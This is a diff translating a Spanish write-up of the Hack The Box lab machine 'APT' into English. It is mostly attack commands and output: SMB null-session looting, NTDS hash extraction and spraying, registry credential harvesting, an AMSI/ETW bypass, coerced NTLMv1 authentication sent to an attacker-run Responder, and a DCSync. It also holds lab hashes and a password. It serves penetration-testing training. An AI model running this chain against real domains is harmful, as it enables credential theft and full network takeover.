@@ -1,6 +1,6 @@
 ﻿# Writeup: APT
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First we perform an Nmap scan of the TCP ports of the victim machine:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -19,7 +19,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 33.59 seconds
 ```
 
->Vamos a usar **IOXIDResolver.py** para obtener la dirección IPv6 Link-Local de la máquina víctima por RPC para poder hacer un escaneo de nmap que quizas tenga más puertos: https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
+>Let's use **IOXIDResolver.py** to get the IPv6 Link-Local address of the victim machine by RPC to be able to do an nmap scan that may have more ports: https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -32,7 +32,7 @@ Address: dead:beef::b885:d62a:d679:573f
 Address: dead:beef::1ce
 ```
 
->Vemos que responden todas las direcciones IPv6:
+>We see that all IPv6 addresses respond:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -48,7 +48,7 @@ PING dead:beef::1ce (dead:beef::1ce) 56 data bytes
 rtt min/avg/max/mdev = 61.180/71.671/100.632/16.731 ms
 ```
 
->Realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima pero ahora por **IPv6** para posiblemente **evadir** ciertas reglas de **firewall** mal configuradas que solo apliquen a IPv4:
+>We performed an Nmap scan of the TCP ports of the victim machine but now by **IPv6** to possibly **evade** certain misconfigured **firewall** rules that only apply to IPv4:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -89,7 +89,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 87.92 seconds
 ```
 
->Vemos por **SMB** que hay una **share** que podemos acceder con **NULL Session**:
+>We see from **SMB** that there is a **share** that we can access with **NULL session**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -106,7 +106,7 @@ SMB         dead:beef::1ce  445    APT              SYSVOL                      
                                                                                                          
 ```
 
->Obtenemos un archivo de **backup** al conectarnos a la share:
+>We get a **backup** file by connecting to the share:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -123,7 +123,7 @@ getting file \backup.zip of size 10650961 as backup.zip (3644.5 KiloBytes/sec) (
 smb: \> exit
 ```
 
->**Crackeamos** la contraseña del **zip**:
+>**We cracked** the **zip** password:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -150,7 +150,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
->Vemos que el backup tiene un **NTDS.dit** con las registry hives **SYSTEM** y **security**:
+>We see that the backup has a **ntds.dit** with the registry hives **SYSTEM** and **SECURITY**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -167,7 +167,7 @@ Session completed.
     └── SYSTEM
 ```
 
->Vamos a extraer los **hashes** **NTLM**:
+>Let's extract the **NTLM hashes**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -181,21 +181,21 @@ Administrator:aes128-cts-hmac-sha1-96:26c50872286f2847fc85cf611871106d
 Administrator:des-cbc-md5:c767fd15d55eabef
 ```
 
->Vamos a crear una lista con los usuarios extraidos:
+>Let's create a list with the extracted users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
 └─$ cat hashesNTLM | grep "aad3b435b51404eeaad3b435b51404ee" | awk {'print $1'} FS=":" > users
 ```
 
->Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:
+>We add the domain names found in the scan to the local resolver in order to resolve their DNS names:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo "dead:beef::1ce apt.htb.local htb.local apt" >> /etc/hosts
 ```
 
->Ahora vamos a usarla con **kerbrute** para ver que usuarios existen:
+>Now let's use it with **kerbrute** to see which users exist:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -218,7 +218,7 @@ Version: dev (n/a) - 01/05/26 - Ronnie Flathers @ropnop
 2026/01/05 11:23:38 >  Done! Tested 2000 usernames (3 valid) in 36.137 seconds
 ```
 
->Hashes de esos usuarios:
+>Hashes from those users:
 
 ```
 henry.vinson:2de80758521541d19cabba480b260e8f
@@ -226,7 +226,7 @@ APT$:b300272f1cdab4469660d55fe59415cb
 Administrator:2b576acbe6bcfda7294d6bd18041b8fe
 ```
 
->Probamos todos pero ninguno es válido:
+>We tried all but none are valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -245,9 +245,9 @@ SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Stan
 SMB         dead:beef::1ce  445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 
 ```
 
->Usaremos **pykerbrute** pero vamos a modificarlo para que opere por **IPv6**: https://github.com/3gstudent/pyKerbrute
+>We will use **pykerbrute** but we will modify it to operate by **IPv6**: https://github.com/3gstudent/pyKerbrute
 
->Modificamos la **función main** con esto:
+>We modified the **main function** with this:
 
 ```python
 if __name__ == '__main__':
@@ -261,21 +261,21 @@ if __name__ == '__main__':
 line.strip('\r\n'))
 ```
 
->Y cambiamos la flag **AF_INET** del socket por **AF_INET6**:
+>And change the **AF_INET** flag of the socket to **AF_INET6**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
 └─$ sed -i "s/AF_INET/AF_INET6/g" pyKerbrute/ADPwdSpray.py
 ```
 
->Creamos una lista con solo los hashes NTLM también:
+>We create a list with only NTLM hashes as well:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
 └─$ cat hashesNTLM | grep "aad3b435b51404eeaad3b435b51404ee" | awk {'print $4'} FS=":" > allNTLM
 ```
 
->Usamos la herramienta y obtenemos el hash NTLM correcto: `henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb`
+>We use the tool and get the correct NTLM hash: `henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -283,7 +283,7 @@ line.strip('\r\n'))
 [+] Valid Login: henry.vinson: e53d87d42adaa3ca32bdb34a876cbffb
 ```
 
->Comprobamos con netexec el hash:
+>We check the hash with netexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -292,7 +292,7 @@ SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Stan
 SMB         dead:beef::1ce  445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
 ```
 
->Vamos a enumerar el registro **HKU** con **reg.py** de impacket:
+>Let's list the **HKU** registry with **Impacket's reg.py**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -311,7 +311,7 @@ HKU\System
 HKU\Volatile Environment
 ```
 
->Enumeramos **software** en el registro **HKU**:
+>We list **software** in the **HKU** registry:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -330,7 +330,7 @@ HKU\Software\Wow6432Node
 HKU\Software\Classes
 ```
 
->Al enumerar **GiganticHostingManagementSystem** vemos credenciales: `henry.vinson_adm:G1#Ny5@2dvht`
+>When listing **GiganticHostingManagementSystem** we see credentials: `henry.vinson_adm:G1#Ny5@2dvht`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -343,7 +343,7 @@ HKU\Software\GiganticHostingManagementSystem
 	PassWord	REG_SZ	G1#Ny5@2dvht
 ```
 
->Probamos las credenciales y vemos que son válidas:
+>We test the credentials and see that they are valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -352,7 +352,7 @@ SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Stan
 SMB         dead:beef::1ce  445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
 ```
 
->Entramos por **WinRM** y obtenemos la primera flag:
+>We enter by **WinRM** and we get the first flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -374,7 +374,7 @@ Info: Establishing connection to remote endpoint
 0a35e093123d69a5c962e55752640b80
 ```
 
->Hacemos un Bypass del AMSI:
+>We Bypass the AMSI:
 
 ```bash
 *Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Bypass-4MSI
@@ -388,7 +388,7 @@ Info: Patching ETW, please be patient ..
 [+] Success!
 ```
 
->Usamos **seatbelt** para ver un path de Escalada de Privilegios: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+>We use **seatbelt** to view a Privilege Escalation path: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
 
 ```bash
 *Evil-WinRM* PS C:\> Invoke-Binary /home/kali/Desktop/academy_tools/Seatbelt.exe -group=all
@@ -418,14 +418,14 @@ Info: Patching ETW, please be patient ..
       OutboundExceptions      : 
 ```
 
->Al estar **NTLMv1 habilitado** podríamos crackear los hashes facilmente para obtener las credenciales en texto plano de algún usuario, para ello ponemos en marcha un listener con responder:
+>Being **NTLMv1 enabled** we could crack the hashes easily to obtain the credentials in plain text of some user, for this we launch a listener with responder:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ sudo responder -I tun0 -v --lm
 ```
 
->Forzamos una conexión a nuestro responder con **MpCmdRun.exe** ya que tenemos acceso por WinRM y obtenemos el hash:
+>We force a connection to our responder with **MpCmdRun.exe** since we have access by WinRM and get the hash:
 
 ```bash
 *Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.71\test
@@ -441,13 +441,13 @@ CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\T
 [SMB] NTLMv1 Hash     : APT$::HTB:4440AA2661D48AA90B91A354F25A6E3A7068EB95BF24B2A2:4440AA2661D48AA90B91A354F25A6E3A7068EB95BF24B2A2:3a175a1a933b0bba
 ```
 
->Si lo pones en plataformas como **crack.sh** que ya no están operativas al cabo de un tiempo te llegaría un correo diciendo que el hash crackeado es el siguiente
+>If you put it on platforms like **crack.sh** that are no longer operational after a while you would get an email saying that the cracked hash is the following
 
 ```
 Key: d167c3238864b12f5f82feae86a7f798
 ```
 
->Así que ahora hacemos un **DCSync** con este hash y tendríamos acceso al **Administrador** del dominio:
+>So now we do a **DCSync** with this hash and we would have access to the **Administrator** of the domain:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
@@ -483,7 +483,7 @@ APT$:des-cbc-md5:76c45245f104a4bf
 [*] Cleaning up... 
 ```
 
->Leemos la flag al acceder como **Administrator** por **WinRM**:
+>We read the flag when logged in as **Administrator** by **WinRM**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
